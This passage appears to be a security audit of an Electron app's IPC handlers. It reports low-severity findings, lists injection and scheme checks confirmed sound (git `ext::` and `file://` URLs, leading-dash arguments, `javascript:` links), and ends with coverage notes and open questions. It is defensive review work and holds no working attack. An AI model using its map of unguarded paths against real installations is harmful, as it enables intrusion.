(`resolvePreviewPath`, `workspace-paths.ts:108-139`, returns `scope: 'external'` instead of
refusing), bounded by `MAX_READ_BYTES = 512 KiB` (`list-workspace-files.ts:94`), and its result
goes to the renderer's preview pane — I found no path feeding it into an agent's context. That is
the intended design, not a finding.

**Fix.** Give both channels the same `safeParse` treatment.

### [IPC-09] Agent-session and terminal broadcasts fan out one IPC message per event

- Severity: **Low**
- Confidence: **Confirmed**
- Where: `src/main/main.ts:922-925`, `src/main/terminal/terminal-service.ts:1338`

```ts
for (const window of BrowserWindow.getAllWindows()) {
    if (!window.isDestroyed()) {
        window.webContents.send(IPC_CHANNELS.agentSessionEvent, payload);
    }
}
```

**What.** No coalescing or batching on either path: every persisted agent session event becomes
its own structured-clone IPC message to every window, and every PTY `onData` chunk becomes a
`terminalOutput` broadcast (the *disk* flush is debounced at 1 s,
`OUTPUT_FLUSH_DEBOUNCE_MS`, but the IPC send is not). The file watcher, by contrast, does debounce
at 250 ms (`watch-workspace-files.ts:6`), which is the shape the other two want.

**Fix.** Coalesce agent session events on a short animation-frame-scale timer and batch terminal
output per session, sending arrays rather than singletons. Measure first — node-pty already
chunks — but the agent-event path is the one with a per-token cadence.

### [IPC-10] The gate re-resolves the whole settings tree on every gated call, and the preload snapshot is synchronous

- Severity: **Low**
- Confidence: **Confirmed**
- Where: `src/main/ipc/handlers.ts:268-271`, `src/main/ipc/handlers/shell-snapshot.ts:39-50`

**What.** `getMode` runs `resolveSettings` per invocation, which reads the config service and
runs `collectSqliteSettings` against the database (`config-resolution.ts:174-186`). The comment
says this is deliberate so settings changes apply live; a cached snapshot invalidated on
config/SQLite change would give the same liveness for a fraction of the work. Separately,
`initialShellSnapshot` is served over `ipcRenderer.sendSync` at preload time
(`src/preload/preload.ts:9`) and builds the health snapshot, the navigation snapshot (a SQLite
read), and the open-target cache while the renderer blocks. Each sub-snapshot is individually
try/caught so it cannot throw, and `getCachedSnapshots` is a cache read — so this is bounded, but
it is a blocking database read on the renderer's critical path.

**Fix.** Memoize the resolved snapshot behind the existing config/DB change notifications. Leave
the sync snapshot alone unless profiling shows it on the startup critical path; if it does, drop
`navigation` from the sync payload and let the async `repositoryWorkspaceNavigation` channel fill
it in.

### [IPC-11] No handler validates `event.senderFrame`

- Severity: **Info**
- Confidence: **Confirmed**
- Where: every registration; `src/main/app/main-window.ts:55-56`

**What.** No handler checks the sending frame. I checked the preconditions that make that
acceptable and they hold: `contextIsolation: true` and `nodeIntegration: false`
(`main-window.ts:55-56`); no `<webview>` tag anywhere in `src/renderer`; navigation to any
http(s) origin other than the app's own is cancelled and handed to the system browser
(`external-links.ts:57-72`), and `window.open` is denied outright (`:52-55`); the Linear asset
scheme is registered `{ secure, standard, supportFetchAPI }` without `bypassCSP` or
`allowServiceWorkers` (`linear-asset-protocol.ts:18-23`) and is served by a main-process handler
rather than mapped to a directory. Revisit this the moment a remote-content frame, a `<webview>`,
or a second BrowserWindow hosting untrusted content is introduced.

## Verified sound

- **Preload bridge.** `createEnsemblrApi` (`src/preload/bridge/ensemblr-api.ts:143`) returns a
  fixed record of typed wrappers; `invoke` resolves the channel from `IPC_CHANNELS` keyed by
  method name (`:106-118`), so a renderer cannot name its own channel. `subscribe` (`:126-136`)
  registers via `ipcRenderer.on` and returns a closure calling `ipcRenderer.off` with the same
  wrapped listener — no leak. The only non-`invoke` member is
  `webUtils.getPathForFile` (`:195`), which is Electron's supported drag-drop path accessor.
- **Git argument handling.** `gitRefSchema` bans a leading `-` and non-ref characters
  (`request-schemas/workspace-git.ts:13-17`); commit hashes are hex-only (`:26`); `git add`,
  `git checkout`, and `git rm` all use `--` (`github-service.ts:555`,
  `workspace-git-status.ts:794,815`); `git fetch` uses `END_OF_OPTIONS`
  (`workspace-git-merge-conflicts.ts:54`); `discardChanges` runs `validateRelativePath` on every
  path before touching the repo (`workspace-git-status.ts:227`).
- **Clone URLs.** `parseGithubUrl` (`src/main/repository/github-url.ts:19-63`) accepts only three
  github.com forms and hands downstream the canonical `owner/repo` slug, so `ext::`, `file://`,
  and `-`-leading URLs cannot reach `git`/`gh`.
- **`openExternal`.** `parseAllowedExternalUrl` allowlists `http:`/`https:` only
  (`external-links-policy.ts:8,25`), rejecting `file:`, `javascript:`, `smb:`, `ssh:`.
- **`.ensemblr/settings.toml` writes.** Script bodies are serialized with `dump` from `js-toml`
  (`repository-settings-writer.ts:17,157`), not string concatenation, so a crafted `command`
  cannot break out of its string; the target path comes from `resolveWritableWorkspaceCheckout`
  rather than the renderer (`handlers/workspace-scripts.ts:98`).
- **Harness resume.** `sessionId` is checked by `isSafeHarnessSessionId` before it is spliced into
  the resume command, degrading to a cwd resume otherwise
  (`agents/harness-detection-service.ts:181`).
- **Open-in targets.** `targetId` is resolved against a static registry
  (`open-target-service.ts:199`), not treated as a command; the relative path is sanitized and the
  `relativePathKind` is re-derived rather than trusted (`handlers/open-target.ts:107-118`).
- **Text-edit commands.** `event.sender[parsed]()` is safe because `textEditCommandSchema` is a
  Zod enum, pinned by `tests/main/text-edit-command-schema.test.ts`.
- **Secrets to the renderer.** The environment snapshot masks secret-classified values
  (`environment-variable-snapshots.ts:116-141`); `infisicalSync` returns key *names*
  (`InfisicalSyncResult.keys`); dictation exposes a status but no getter for the key
  (`handlers/dictation.ts:34-50`). The one raw-value channel,
  `readEnvironmentVariableValue`, is the deliberate reveal button and reads only SQLite and the
  platform secret store.
- **Size caps.** Terminal writes are truncated at 64 KiB (`terminal-service.ts:73,1862`) and
  dimensions clamped to 2–1000 (`:62-63,1868-1873`); attachments cap base64 at 20 MB / 70 MB
  (`request-schemas/workspace-files.ts:35,49`); dictation audio is byte-capped
  (`request-schemas/dictation.ts:27-31`); `getWorkspaceCommits` caps `limit` at 100.

## Coverage

Read in full: `src/preload/preload.ts`, `src/preload/bridge/ensemblr-api.ts`,
`src/main/ipc/permission-gate.ts`, `src/main/ipc/handlers.ts`, `src/shared/permissions.ts`, and
the handler modules for terminal, window, workspace-files, workspace-git, github, open-target,
environment, infisical, dictation, app-settings, repository-settings, workspace-scripts, setup,
update, navigation, health, settings, repository-sources, agents, menu, text-editing, checkpoint,
shell-snapshot. Read the schemas for primitives, agent-session, agent-provider, dictation,
workspace-git, workspace-files, github, clone, checkpoint, linked-directories, and the
repository/workspace-scripts heads. Traced into `config-resolution.ts`, `terminal-service.ts`,
`external-links-policy.ts`, `github-url.ts`, `workspace-cwd.ts`, `workspace-paths.ts`,
`repository-scripts-writer.ts`, `repository-settings-writer.ts`, `harness-detection-service.ts`,
`environment-variables.ts`, `environment-variable-snapshots.ts`, `agent-control-service.ts`.

The inventory was generated by parsing every `ipcMain.handle` / `ipcMain.on` /
`withPermissionGate` call in `src/main` (178 real registrations; the 179th match is the gate's own
generic wrapper at `permission-gate.ts:97`). The Reaches column is from reading each handler and
one level into its service — it is not a transitive call-graph analysis.

Not covered: the agent-control HTTP surface and the MCP bridge (a sibling auditor's dimension,
touched only where it shares `classifyPermissionAction`); renderer-side XSS reachability; the
`concierge`, `linear`, `review`, `chat-tab`, and `settings-publication` services below their
handlers.

## Open questions

1. **Was app-scope mode resolution intentional at some point?** If a global `security.permissionMode`
   in `~/.config/ensemblr/config.json` is a supported knob, IPC-01 is "the repo scope was never
   wired" rather than "the wrong scope is read" — but the outcome and the fix are the same, and
   nothing in the UI or `schemas/config.schema.json` surfaced an app-level editor to me.
2. **Where is `confirmation-required` meant to be answered for IPC?** The control server has a
   `confirm` port; the gate has none. Is the intent that the renderer's own dialogs are the
   confirmation (in which case the gate should classify those actions differently), or that main
   should raise a native dialog as it does for agents?
3. **How much of IPC-02 should land as a gate vs. a service-level check?** Gating
   `createTerminalSession` at the IPC boundary leaves the same service reachable from
   `launchAgentHarness` and the script lifecycle; a check inside `terminalService.create` would
   cover all three at once but moves policy out of `src/main/ipc/`, against the pattern in
   `.claude/rules/patterns.md`.
